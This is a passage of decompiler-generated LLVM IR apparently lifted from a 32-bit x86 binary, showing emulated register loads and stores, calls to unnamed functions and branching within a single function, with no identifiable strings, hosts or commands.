  %v1_804dee5 = inttoptr i32 %v3_804dee4 to i32*
  store i32 %v3_804dedf, i32* %v1_804dee5, align 4
  %v1_804dee7 = add i32 %v0_804dee4, 8328
  store i32 %v1_804dee7, i32* %eax.global-to-local, align 4
  store i32 %v1_804dee7, i32* %v1_804dee4, align 4
  %v3_804deef = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804deef, i32* %eax.global-to-local, align 4
  %v0_804def4 = load i32, i32* @esp, align 4
  %v1_804def4 = add i32 %v0_804def4, 8328
  %v1_804defb = inttoptr i32 %v0_804def4 to i32*
  %v3_804defb = add i32 %v0_804def4, 4
  %v2_804defc = add i32 %v1_804def4, %v3_804deef
  store i32 %v2_804defc, i32* @esi, align 4
  %v1_804defe = inttoptr i32 %v3_804defb to i32*
  %v2_804defe = load i32, i32* %v1_804defe, align 4
  store i32 %v2_804defe, i32* @ebx, align 4
  %v0_804deff = load i32, i32* @edi, align 4
  store i32 %v0_804deff, i32* %v1_804defe, align 4
  %v0_804df00 = load i32, i32* @esi, align 4
  store i32 %v0_804df00, i32* %v1_804defb, align 4
  %v3_804df01 = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df01, i32* %eax.global-to-local, align 4
  store i32 %v3_804df01, i32* @ebx, align 4
  %v0_804df08 = load i32, i32* @esp, align 4
  %v1_804df08 = inttoptr i32 %v0_804df08 to i32*
  %v2_804df08 = load i32, i32* %v1_804df08, align 4
  store i32 %v2_804df08, i32* %eax.global-to-local, align 4
  %v3_804df08 = add i32 %v0_804df08, 4
  %v1_804df09 = inttoptr i32 %v3_804df08 to i32*
  store i32 0, i32* %v1_804df09, align 4
  store i32 7, i32* %v1_804df08, align 4
  %v3_804df0e = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804df0e, i32* %eax.global-to-local, align 4
  %v0_804df13 = load i32, i32* @esp, align 4
  %v1_804df13 = inttoptr i32 %v0_804df13 to i32*
  %v3_804df13 = add i32 %v0_804df13, 4
  %v1_804df14 = inttoptr i32 %v3_804df13 to i32*
  store i32 %v3_804df0e, i32* %v1_804df14, align 4
  %v0_804df16 = load i32, i32* @esi, align 4
  %v1_804df16 = load i32, i32* @ebx, align 4
  %v2_804df16 = add i32 %v1_804df16, %v0_804df16
  store i32 %v2_804df16, i32* %eax.global-to-local, align 4
  store i32 %v2_804df16, i32* %v1_804df13, align 4
  %v3_804df1a = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df1a, i32* %eax.global-to-local, align 4
  %v0_804df1f = load i32, i32* @esp, align 4
  %v1_804df1f = inttoptr i32 %v0_804df1f to i32*
  %v3_804df1f = add i32 %v0_804df1f, 4
  %v1_804df20 = inttoptr i32 %v3_804df1f to i32*
  %v2_804df20 = load i32, i32* %v1_804df20, align 4
  store i32 %v2_804df20, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804df20, align 4
  store i32 6, i32* %v1_804df1f, align 4
  %v3_804df25 = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804df25, i32* %eax.global-to-local, align 4
  %v0_804df2a = load i32, i32* @esp, align 4
  %v1_804df2a = inttoptr i32 %v0_804df2a to i32*
  %v3_804df2a = add i32 %v0_804df2a, 4
  %v1_804df2b = inttoptr i32 %v3_804df2a to i32*
  %v2_804df2b = load i32, i32* %v1_804df2b, align 4
  store i32 %v2_804df2b, i32* @ebx, align 4
  store i32 %v3_804df25, i32* %v1_804df2b, align 4
  %v1_804df2d = add i32 %v0_804df2a, 8264
  store i32 %v1_804df2d, i32* %eax.global-to-local, align 4
  store i32 %v1_804df2d, i32* %v1_804df2a, align 4
  %v3_804df35 = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df35, i32* %eax.global-to-local, align 4
  %v0_804df3a = load i32, i32* @esp, align 4
  %v1_804df3a = add i32 %v3_804df35, 8264
  %v2_804df41 = add i32 %v1_804df3a, %v0_804df3a
  store i32 %v2_804df41, i32* @esi, align 4
  %v1_804df43 = inttoptr i32 %v0_804df3a to i32*
  %v2_804df43 = load i32, i32* %v1_804df43, align 4
  store i32 %v2_804df43, i32* %eax.global-to-local, align 4
  %v3_804df43 = add i32 %v0_804df3a, 4
  %v1_804df44 = inttoptr i32 %v3_804df43 to i32*
  %v0_804df45 = load i32, i32* @edi, align 4
  store i32 %v0_804df45, i32* %v1_804df44, align 4
  %v0_804df46 = load i32, i32* @esi, align 4
  store i32 %v0_804df46, i32* %v1_804df43, align 4
  %v3_804df47 = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df47, i32* %eax.global-to-local, align 4
  %v0_804df4c = load i32, i32* @esp, align 4
  %v1_804df4c = inttoptr i32 %v0_804df4c to i32*
  %v3_804df4c = add i32 %v0_804df4c, 4
  %v1_804df4d = inttoptr i32 %v3_804df4c to i32*
  store i32 %v3_804df47, i32* @ebx, align 4
  store i32 0, i32* %v1_804df4d, align 4
  store i32 11, i32* %v1_804df4c, align 4
  %v3_804df54 = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804df54, i32* %eax.global-to-local, align 4
  %v0_804df59 = load i32, i32* @esp, align 4
  %v1_804df59 = inttoptr i32 %v0_804df59 to i32*
  %v3_804df59 = add i32 %v0_804df59, 4
  %v1_804df5a = inttoptr i32 %v3_804df59 to i32*
  store i32 %v3_804df54, i32* %v1_804df5a, align 4
  %v0_804df5c = load i32, i32* @esi, align 4
  %v1_804df5c = load i32, i32* @ebx, align 4
  %v2_804df5c = add i32 %v1_804df5c, %v0_804df5c
  store i32 %v2_804df5c, i32* %eax.global-to-local, align 4
  store i32 %v2_804df5c, i32* %v1_804df59, align 4
  %v3_804df60 = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df60, i32* %eax.global-to-local, align 4
  %v0_804df65 = load i32, i32* @esp, align 4
  %v1_804df65 = inttoptr i32 %v0_804df65 to i32*
  store i32 6, i32* %v1_804df65, align 4
  %v2_804df6c = call i32 @function_8050b60(i8 0)
  store i32 %v2_804df6c, i32* %eax.global-to-local, align 4
  %v0_804df71 = load i32, i32* @esp, align 4
  %v1_804df71 = inttoptr i32 %v0_804df71 to i32*
  store i32 7, i32* %v1_804df71, align 4
  %v2_804df78 = call i32 @function_8050b60(i8 0)
  %v0_804df7d = load i32, i32* @esp, align 4
  %v1_804df80 = add i32 %v0_804df7d, 8
  %v2_804df80 = inttoptr i32 %v1_804df80 to i32*
  store i32 4095, i32* %v2_804df80, align 4
  %v1_804df85 = add i32 %v0_804df7d, 4168
  store i32 %v1_804df85, i32* @edi, align 4
  %v2_804df8c = add i32 %v0_804df7d, 4
  %v3_804df8c = inttoptr i32 %v2_804df8c to i32*
  store i32 %v1_804df85, i32* %v3_804df8c, align 4
  %v1_804df8d = add i32 %v0_804df7d, 8328
  store i32 %v1_804df8d, i32* %eax.global-to-local, align 4
  %v3_804df94 = inttoptr i32 %v0_804df7d to i32*
  store i32 %v1_804df8d, i32* %v3_804df94, align 4
  %v4_804df95 = call i32 @function_8051c52(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804df95, i32* %eax.global-to-local, align 4
  %v0_804df9a = load i32, i32* @esp, align 4
  %v1_804df9a = add i32 %v0_804df9a, 16
  store i32 %v4_804df95, i32* @ebx, align 4
  %v10_804df9f = icmp eq i32 %v4_804df95, -1
  br i1 %v10_804df9f, label %dec_label_pc_804e0c7, label %dec_label_pc_804dfa8

dec_label_pc_804dfa8:                             ; preds = %dec_label_pc_804deb3
  %v2_804dfa8 = add i32 %v4_804df95, 4152
  %v3_804dfa8 = add i32 %v2_804dfa8, %v1_804df9a
  %v4_804dfa8 = inttoptr i32 %v3_804dfa8 to i8*
  store i8 0, i8* %v4_804dfa8, align 1
  %v0_804dfb0 = load i32, i32* @esp, align 4
  %v1_804dfb3 = add i32 %v0_804dfb0, -16
  %v2_804dfb3 = inttoptr i32 %v1_804dfb3 to i32*
  store i32 10, i32* %v2_804dfb3, align 4
  %v2_804dfb5 = call i32 @function_8050be0(i8 0)
  store i32 %v2_804dfb5, i32* %eax.global-to-local, align 4
  %v0_804dfba = load i32, i32* @esp, align 4
  %v1_804dfba = inttoptr i32 %v0_804dfba to i32*
  %v3_804dfba = add i32 %v0_804dfba, 4
  %v1_804dfbb = inttoptr i32 %v3_804dfba to i32*
  %v2_804dfbb = load i32, i32* %v1_804dfbb, align 4
  store i32 %v2_804dfbb, i32* @esi, align 4
  store i32 0, i32* %v1_804dfbb, align 4
  store i32 10, i32* %v1_804dfba, align 4
  %v3_804dfc0 = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  %v0_804dfc5 = load i32, i32* @esp, align 4
  %v2_804dfc8 = add i32 %v0_804dfc5, 8
  %v3_804dfc8 = inttoptr i32 %v2_804dfc8 to i32*
  store i32 %v3_804dfc0, i32* %v3_804dfc8, align 4
  %v0_804dfc9 = load i32, i32* @ebx, align 4
  %v1_804dfc9 = add i32 %v0_804dfc9, -1
  store i32 %v1_804dfc9, i32* %eax.global-to-local, align 4
  %v2_804dfcc = add i32 %v0_804dfc5, 4
  %v3_804dfcc = inttoptr i32 %v2_804dfcc to i32*
  store i32 %v1_804dfc9, i32* %v3_804dfcc, align 4
  %v1_804dfcd = add i32 %v0_804dfc5, 4168
  store i32 %v1_804dfcd, i32* @edi, align 4
  %v3_804dfd4 = inttoptr i32 %v0_804dfc5 to i32*
  store i32 %v1_804dfcd, i32* %v3_804dfd4, align 4
  %v4_804dfd5 = call i32 @function_80517d0(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804dfda = load i32, i32* @esp, align 4
  %v1_804dfdd = add i32 %v4_804dfd5, 1
  %v8_804dfdd = icmp eq i32 %v1_804dfdd, 0
  store i32 %v1_804dfdd, i32* %eax.global-to-local, align 4
  br i1 %v8_804dfdd, label %dec_label_pc_804dffd, label %dec_label_pc_804dfe0

dec_label_pc_804dfe0:                             ; preds = %dec_label_pc_804dfa8
  %v1_804dfe3 = add i32 %v0_804dfda, 4168
  store i32 %v1_804dfe3, i32* %eax.global-to-local, align 4
  %v3_804dfea = inttoptr i32 %v0_804dfda to i32*
  store i32 %v1_804dfe3, i32* %v3_804dfea, align 4
  %v0_804dfeb = call i32 @function_8051d70()
  store i32 %v0_804dfeb, i32* %eax.global-to-local, align 4
  %v0_804dff0 = load i32, i32* @esp, align 4
  %v1_804dff0 = inttoptr i32 %v0_804dff0 to i32*
  %v2_804dff0 = load i32, i32* %v1_804dff0, align 4
  store i32 %v2_804dff0, i32* %eax.global-to-local, align 4
  %v3_804dff0 = add i32 %v0_804dff0, 4
  %v1_804dff1 = inttoptr i32 %v3_804dff0 to i32*
  store i32 9, i32* %v1_804dff1, align 4
  %v0_804dff4 = load i32, i32* @ebp, align 4
  store i32 %v0_804dff4, i32* %v1_804dff0, align 4
  %v4_804dff5 = call i32 @function_8051b60(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804dff5, i32* %eax.global-to-local, align 4
  %v0_804dffa = load i32, i32* @esp, align 4
  br label %dec_label_pc_804dffd

dec_label_pc_804dffd:                             ; preds = %dec_label_pc_804dfa8, %dec_label_pc_804dfe0
  %v0_804dffd.in = phi i32 [ %v0_804dfda, %dec_label_pc_804dfa8 ], [ %v0_804dffa, %dec_label_pc_804dfe0 ]
  %v2_804e000 = inttoptr i32 %v0_804dffd.in to i32*
  store i32 10, i32* %v2_804e000, align 4
  %v2_804e002 = call i32 @function_8050b60(i8 0)
  store i32 %v2_804e002, i32* %eax.global-to-local, align 4
  %v0_804e007 = call i32 @function_8051ad5()
  store i32 %v0_804e007, i32* %eax.global-to-local, align 4
  %v0_804e00c = load i32, i32* @esp, align 4
  %v1_804e00c = add i32 %v0_804e00c, 16
  %v0_804e00f = load i32, i32* @ebp, align 4
  %v12_804e00f = icmp eq i32 %v0_804e00f, %v0_804e007
  br i1 %v12_804e00f, label %dec_label_pc_804e038, label %dec_label_pc_804e013

dec_label_pc_804e013:                             ; preds = %dec_label_pc_804dffd
  %v0_804e013 = call i32 @function_8051afb()
  store i32 %v0_804e013, i32* %eax.global-to-local, align 4
  %v0_804e018 = load i32, i32* @ebp, align 4
  %v12_804e018 = icmp eq i32 %v0_804e018, %v0_804e013
  %v0_804e03a.pre = load i32, i32* @esp, align 4
  br i1 %v12_804e018, label %dec_label_pc_804e038, label %dec_label_pc_804e01c

dec_label_pc_804e01c:                             ; preds = %dec_label_pc_804e013
  %v2_804e01c = add i32 %v0_804e03a.pre, -4
  %v3_804e01c = inttoptr i32 %v2_804e01c to i32*
  store i32 %v0_804e013, i32* %v3_804e01c, align 4
  %v2_804e01d = add i32 %v0_804e03a.pre, -8
  %v3_804e01d = inttoptr i32 %v2_804e01d to i32*
  store i32 %v0_804e013, i32* %v3_804e01d, align 4
  %v0_804e01e = load i32, i32* @global_var_80561c0.22, align 64
  store i32 %v0_804e01e, i32* %eax.global-to-local, align 4
  %v2_804e023 = add i32 %v0_804e03a.pre, -12
  %v3_804e023 = inttoptr i32 %v2_804e023 to i32*
  store i32 %v0_804e01e, i32* %v3_804e023, align 4
  %v1_804e024 = add i32 %v0_804e03a.pre, 4152
  store i32 %v1_804e024, i32* @edi, align 4
  %v2_804e02b = add i32 %v0_804e03a.pre, -16
  %v3_804e02b = inttoptr i32 %v2_804e02b to i32*
  store i32 %v1_804e024, i32* %v3_804e02b, align 4
  %v0_804e02c = call i32 @function_8051850()
  store i32 %v0_804e02c, i32* %eax.global-to-local, align 4
  %v0_804e031 = load i32, i32* @esp, align 4
  %v3_804e034 = trunc i32 %v0_804e02c to i8
  %v4_804e034 = icmp eq i8 %v3_804e034, 0
  br i1 %v4_804e034, label %dec_label_pc_804e093, label %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge

dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge: ; preds = %dec_label_pc_804e01c
  %v1_804e031 = add i32 %v0_804e031, 16
  %v0_804e038.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804e038

dec_label_pc_804e038:                             ; preds = %dec_label_pc_804e013, %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge, %dec_label_pc_804dffd
  %v0_804e03a = phi i32 [ %v1_804e031, %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge ], [ %v1_804e00c, %dec_label_pc_804dffd ], [ %v0_804e03a.pre, %dec_label_pc_804e013 ]
  %v0_804e038 = phi i32 [ %v0_804e038.pre, %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge ], [ %v0_804e007, %dec_label_pc_804dffd ], [ %v0_804e013, %dec_label_pc_804e013 ]
  store i32 %v0_804e038, i32* @esi, align 4
  %v1_804e03a = add i32 %v0_804e03a, 8
  %v2_804e03a = inttoptr i32 %v1_804e03a to i32*
  %v3_804e03a = load i32, i32* %v2_804e03a, align 4
  store i32 %v3_804e03a, i32* @ebx, align 4
  br label %dec_label_pc_804de50

dec_label_pc_804e043:                             ; preds = %dec_label_pc_804de50
  %v1_804e046 = add i32 %v0_804de5d, 32
  %v2_804e046 = inttoptr i32 %v1_804e046 to i32*
  %v3_804e046 = load i32, i32* %v2_804e046, align 4
  store i32 %v3_804e046, i32* @eax, align 4
  %v3_804e04a = inttoptr i32 %v0_804de5d to i32*
  store i32 %v3_804e046, i32* %v3_804e04a, align 4
  %v0_804e04b = call i32 @function_8051dd4()
  store i32 %v0_804e04b, i32* %eax.global-to-local, align 4
  %v0_804e050 = load i32, i32* @esp, align 4
  %v1_804e050 = add i32 %v0_804e050, 16
  br label %dec_label_pc_804de10

dec_label_pc_804e058:                             ; preds = %dec_label_pc_804de92
  %v0_804e058 = load i32, i32* @ebp, align 4
  %v7_804e05e = icmp sgt i32 %v0_804e058, 400
  br i1 %v7_804e05e, label %dec_label_pc_804e064, label %dec_label_pc_804de50

dec_label_pc_804e064:                             ; preds = %dec_label_pc_804e058
  store i32 -858993459, i32* %eax.global-to-local, align 4
  %v1_804e069 = add i32 %v0_804de9e, 28
  %v2_804e069 = inttoptr i32 %v1_804e069 to i32*
  %v3_804e069 = load i32, i32* %v2_804e069, align 4
  %v10_804e069 = udiv i32 %v3_804e069, 2
  store i32 %v10_804e069, i32* @edx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804e077 = load i32, i32* %v2_804e069, align 4
  %v15_804e077 = icmp eq i32 %v3_804e077, 0
  %v1_804e07b = icmp eq i1 %v15_804e077, false
  br i1 %v1_804e07b, label %dec_label_pc_804de50, label %dec_label_pc_804e081

dec_label_pc_804e081:                             ; preds = %dec_label_pc_804e064
  %v2_804e084 = inttoptr i32 %v0_804de9e to i32*
  store i32 1, i32* %v2_804e084, align 4
  %v1_804e086 = call i32 @function_8053630(i32 0)
  store i32 %v1_804e086, i32* %eax.global-to-local, align 4
  %v0_804e08b = load i32, i32* @esp, align 4
  %v1_804e08b = add i32 %v0_804e08b, 16
  br label %dec_label_pc_804de50

dec_label_pc_804e093:                             ; preds = %dec_label_pc_804e01c
  %v2_804e093 = add i32 %v0_804e031, 12
  %v3_804e093 = inttoptr i32 %v2_804e093 to i32*
  store i32 %v0_804e02c, i32* %v3_804e093, align 4
  %v2_804e094 = add i32 %v0_804e031, 8
  %v3_804e094 = inttoptr i32 %v2_804e094 to i32*
  store i32 %v0_804e02c, i32* %v3_804e094, align 4
  %v1_804e095 = add i32 %v0_804e031, 4
  %v2_804e095 = inttoptr i32 %v1_804e095 to i32*
  store i32 0, i32* %v2_804e095, align 4
  %v1_804e097 = add i32 %v0_804e031, 4168
  store i32 %v1_804e097, i32* %eax.global-to-local, align 4
  %v3_804e09e = inttoptr i32 %v0_804e031 to i32*
  store i32 %v1_804e097, i32* %v3_804e09e, align 4
  %v3_804e09f = call i32 @function_8051b92(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e09f, i32* %eax.global-to-local, align 4
  %v0_804e0a4 = load i32, i32* @esp, align 4
  store i32 %v3_804e09f, i32* @ebx, align 4
  %v10_804e0a9 = icmp eq i32 %v3_804e09f, -1
  %v1_804e0ac = icmp eq i1 %v10_804e0a9, false
  br i1 %v1_804e0ac, label %dec_label_pc_804e0bb, label %dec_label_pc_804e0ae

dec_label_pc_804e0ae:                             ; preds = %dec_label_pc_804e093
  %v0_804e0ae = load i32, i32* @edi, align 4
  %v2_804e0ae = add i32 %v0_804e0a4, 12
  %v3_804e0ae = inttoptr i32 %v2_804e0ae to i32*
  store i32 %v0_804e0ae, i32* %v3_804e0ae, align 4
  %v0_804e0af = load i32, i32* @edi, align 4
  %v2_804e0af = add i32 %v0_804e0a4, 8
  %v3_804e0af = inttoptr i32 %v2_804e0af to i32*
  store i32 %v0_804e0af, i32* %v3_804e0af, align 4
  %v1_804e0b0 = add i32 %v0_804e0a4, 4
  %v2_804e0b0 = inttoptr i32 %v1_804e0b0 to i32*
  store i32 9, i32* %v2_804e0b0, align 4
  %v0_804e0b2 = load i32, i32* @ebp, align 4
  %v3_804e0b2 = inttoptr i32 %v0_804e0a4 to i32*
  store i32 %v0_804e0b2, i32* %v3_804e0b2, align 4
  %v4_804e0b3 = call i32 @function_8051b60(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e0b3, i32* %eax.global-to-local, align 4
  %v0_804e0b8 = load i32, i32* @esp, align 4
  %v0_804e0be.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e0bb

dec_label_pc_804e0bb:                             ; preds = %dec_label_pc_804e093, %dec_label_pc_804e0ae
  %v0_804e0be = phi i32 [ %v3_804e09f, %dec_label_pc_804e093 ], [ %v0_804e0be.pre, %dec_label_pc_804e0ae ]
  %v0_804e0bb.in = phi i32 [ %v0_804e0a4, %dec_label_pc_804e093 ], [ %v0_804e0b8, %dec_label_pc_804e0ae ]
  %v3_804e0be = inttoptr i32 %v0_804e0bb.in to i32*
  store i32 %v0_804e0be, i32* %v3_804e0be, align 4
  %v1_804e0bf = call i32 @function_8051a81(i32 0)
  store i32 %v1_804e0bf, i32* %eax.global-to-local, align 4
  %v0_804e0c4 = load i32, i32* @esp, align 4
  %v1_804e0c4 = add i32 %v0_804e0c4, 16
  br label %dec_label_pc_804e0c7

dec_label_pc_804e0c7:                             ; preds = %dec_label_pc_804deb3, %dec_label_pc_804e0bb
  %v1_804e0c7 = phi i32 [ %v1_804df9a, %dec_label_pc_804deb3 ], [ %v1_804e0c4, %dec_label_pc_804e0bb ]
  %v0_804e0c7 = load i32, i32* @esi, align 4
  %v2_804e0c7 = add i32 %v1_804e0c7, -4
  %v3_804e0c7 = inttoptr i32 %v2_804e0c7 to i32*
  store i32 %v0_804e0c7, i32* %v3_804e0c7, align 4
  %v0_804e0c8 = load i32, i32* @esi, align 4
  %v2_804e0c8 = add i32 %v1_804e0c7, -8
  %v3_804e0c8 = inttoptr i32 %v2_804e0c8 to i32*
  store i32 %v0_804e0c8, i32* %v3_804e0c8, align 4
  %v1_804e0c9 = add i32 %v1_804e0c7, -12
  %v2_804e0c9 = inttoptr i32 %v1_804e0c9 to i32*
  store i32 0, i32* %v2_804e0c9, align 4
  %v1_804e0cb = add i32 %v1_804e0c7, 8312
  %v2_804e0d2 = add i32 %v1_804e0c7, -16
  %v3_804e0d2 = inttoptr i32 %v2_804e0d2 to i32*
  store i32 %v1_804e0cb, i32* %v3_804e0d2, align 4
  %v3_804e0d3 = call i32 @function_8051b92(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v1_804e0d8 = load i32, i32* @esp, align 4
  %v2_804e0d8 = add i32 %v1_804e0d8, 56
  %v3_804e0d8 = inttoptr i32 %v2_804e0d8 to i32*
  store i32 %v3_804e0d3, i32* %v3_804e0d8, align 4
  %v0_804e0dc = load i32, i32* @esp, align 4
  %v1_804e0df = add i32 %v3_804e0d3, 1
  %v8_804e0df = icmp eq i32 %v1_804e0df, 0
  store i32 %v1_804e0df, i32* @eax, align 4
  br i1 %v8_804e0df, label %dec_label_pc_804e31c, label %dec_label_pc_804e0e6

dec_label_pc_804e0e6:                             ; preds = %dec_label_pc_804e0c7
  %v2_804e0e9 = inttoptr i32 %v0_804e0dc to i32*
  store i32 12, i32* %v2_804e0e9, align 4
  %v2_804e0eb = call i32 @function_8050be0(i8 0)
  store i32 %v2_804e0eb, i32* %eax.global-to-local, align 4
  %v0_804e0f0 = load i32, i32* @esp, align 4
  %v1_804e0f0 = inttoptr i32 %v0_804e0f0 to i32*
  store i32 13, i32* %v1_804e0f0, align 4
  %v2_804e0f7 = call i32 @function_8050be0(i8 0)
  store i32 %v2_804e0f7, i32* %eax.global-to-local, align 4
  %v0_804e0fc = load i32, i32* @esp, align 4
  %v1_804e0fc = inttoptr i32 %v0_804e0fc to i32*
  store i32 14, i32* %v1_804e0fc, align 4
  %v2_804e103 = call i32 @function_8050be0(i8 0)
  store i32 %v2_804e103, i32* %eax.global-to-local, align 4
  %v0_804e108 = load i32, i32* @esp, align 4
  %v1_804e108 = inttoptr i32 %v0_804e108 to i32*
  store i32 15, i32* %v1_804e108, align 4
  %v2_804e10f = call i32 @function_8050be0(i8 0)
  store i32 %v2_804e10f, i32* %eax.global-to-local, align 4
  %v0_804e114 = load i32, i32* @esp, align 4
  %v1_804e114 = inttoptr i32 %v0_804e114 to i32*
  store i32 16, i32* %v1_804e114, align 4
  %v2_804e11b = call i32 @function_8050be0(i8 0)
  store i32 %v2_804e11b, i32* %eax.global-to-local, align 4
  %v0_804e120 = load i32, i32* @esp, align 4
  %v1_804e120 = inttoptr i32 %v0_804e120 to i32*
  %v3_804e120 = add i32 %v0_804e120, 4
  %v1_804e121 = inttoptr i32 %v3_804e120 to i32*
  %v1_804e122 = add i32 %v0_804e120, 8436
  store i32 %v1_804e122, i32* %eax.global-to-local, align 4
  store i32 %v1_804e122, i32* %v1_804e121, align 4
  store i32 12, i32* %v1_804e120, align 4
  %v3_804e12c = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804e12c, i32* %eax.global-to-local, align 4
  %v1_804e131 = load i32, i32* @esp, align 4
  %v2_804e131 = add i32 %v1_804e131, 52
  %v3_804e131 = inttoptr i32 %v2_804e131 to i32*
  store i32 %v3_804e12c, i32* %v3_804e131, align 4
  %v0_804e135 = load i32, i32* @esp, align 4
  %v1_804e135 = inttoptr i32 %v0_804e135 to i32*
  %v3_804e135 = add i32 %v0_804e135, 4
  %v1_804e136 = inttoptr i32 %v3_804e135 to i32*
  %v1_804e137 = add i32 %v0_804e135, 8432
  store i32 %v1_804e137, i32* %eax.global-to-local, align 4
  store i32 %v1_804e137, i32* %v1_804e136, align 4
  store i32 13, i32* %v1_804e135, align 4
  %v3_804e141 = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804e141, i32* %eax.global-to-local, align 4
  %v1_804e146 = load i32, i32* @esp, align 4
  %v2_804e146 = add i32 %v1_804e146, 48
  %v3_804e146 = inttoptr i32 %v2_804e146 to i32*
  store i32 %v3_804e141, i32* %v3_804e146, align 4
  %v0_804e14a = load i32, i32* @esp, align 4
  %v1_804e14a = inttoptr i32 %v0_804e14a to i32*
  %v3_804e14a = add i32 %v0_804e14a, 4
  %v1_804e14b = inttoptr i32 %v3_804e14a to i32*
  %v2_804e14b = load i32, i32* %v1_804e14b, align 4
  store i32 %v2_804e14b, i32* @edi, align 4
  %v1_804e14c = add i32 %v0_804e14a, 8428
  store i32 %v1_804e14c, i32* %eax.global-to-local, align 4
  store i32 %v1_804e14c, i32* %v1_804e14b, align 4
  store i32 14, i32* %v1_804e14a, align 4
  %v3_804e156 = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804e156, i32* %eax.global-to-local, align 4
  %v1_804e15b = load i32, i32* @esp, align 4
  %v2_804e15b = add i32 %v1_804e15b, 44
  %v3_804e15b = inttoptr i32 %v2_804e15b to i32*
  store i32 %v3_804e156, i32* %v3_804e15b, align 4
  %v0_804e15f = load i32, i32* @esp, align 4
  %v1_804e15f = inttoptr i32 %v0_804e15f to i32*
  %v3_804e15f = add i32 %v0_804e15f, 4
  %v1_804e160 = inttoptr i32 %v3_804e15f to i32*
  %v2_804e160 = load i32, i32* %v1_804e160, align 4
  store i32 %v2_804e160, i32* @ebx, align 4
  %v1_804e161 = add i32 %v0_804e15f, 8440
  store i32 %v1_804e161, i32* %eax.global-to-local, align 4
  store i32 %v1_804e161, i32* %v1_804e160, align 4
  store i32 15, i32* %v1_804e15f, align 4
  %v3_804e16b = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804e16b, i32* %eax.global-to-local, align 4
  %v1_804e170 = load i32, i32* @esp, align 4
  %v2_804e170 = add i32 %v1_804e170, 40
  %v3_804e170 = inttoptr i32 %v2_804e170 to i32*
  store i32 %v3_804e16b, i32* %v3_804e170, align 4
  %v0_804e174 = load i32, i32* @esp, align 4
  %v1_804e174 = inttoptr i32 %v0_804e174 to i32*
  %v3_804e174 = add i32 %v0_804e174, 4
  %v1_804e175 = inttoptr i32 %v3_804e174 to i32*
  %v1_804e176 = add i32 %v0_804e174, 8424
  store i32 %v1_804e176, i32* %eax.global-to-local, align 4
  store i32 %v1_804e176, i32* %v1_804e175, align 4
  store i32 16, i32* %v1_804e174, align 4
  %v3_804e180 = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804e180, i32* %eax.global-to-local, align 4
  %v1_804e185 = load i32, i32* @esp, align 4
  %v2_804e185 = add i32 %v1_804e185, 36
  %v3_804e185 = inttoptr i32 %v2_804e185 to i32*
  store i32 %v3_804e180, i32* %v3_804e185, align 4
  %v0_804e189 = load i32, i32* @esp, align 4
  %v1_804e189 = add i32 %v0_804e189, 16
  %v0_804e18c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e18c

dec_label_pc_804e18c:                             ; preds = %dec_label_pc_804e288, %dec_label_pc_804e2a0.backedge, %dec_label_pc_804e297, %dec_label_pc_804e0e6
  %v1_804e18c = phi i32 [ %v1_804e189, %dec_label_pc_804e0e6 ], [ %v0_804e297, %dec_label_pc_804e297 ], [ %v0_804e297, %dec_label_pc_804e2a0.backedge ], [ %v0_804e297, %dec_label_pc_804e288 ]
  %v0_804e18c = phi i32 [ %v0_804e18c.pre, %dec_label_pc_804e0e6 ], [ %v0_804e18c52, %dec_label_pc_804e297 ], [ %v6_804e2ae, %dec_label_pc_804e2a0.backedge ], [ %v0_804e18c52, %dec_label_pc_804e288 ]
  %v2_804e18c = add i32 %v1_804e18c, -4
  %v3_804e18c = inttoptr i32 %v2_804e18c to i32*
  store i32 %v0_804e18c, i32* %v3_804e18c, align 4
  %v1_804e18d = add i32 %v1_804e18c, -8
  %v2_804e18d = inttoptr i32 %v1_804e18d to i32*
  store i32 4096, i32* %v2_804e18d, align 4
  %v1_804e192 = add i32 %v1_804e18c, 56
  store i32 %v1_804e192, i32* %eax.global-to-local, align 4
  %v2_804e196 = add i32 %v1_804e18c, -12
  %v3_804e196 = inttoptr i32 %v2_804e196 to i32*
  store i32 %v1_804e192, i32* %v3_804e196, align 4
  %v1_804e197 = add i32 %v1_804e18c, 40
  %v2_804e197 = inttoptr i32 %v1_804e197 to i32*
  %v3_804e197 = load i32, i32* %v2_804e197, align 4
  store i32 %v3_804e197, i32* %eax.global-to-local, align 4
  %v2_804e19b = add i32 %v1_804e18c, -16
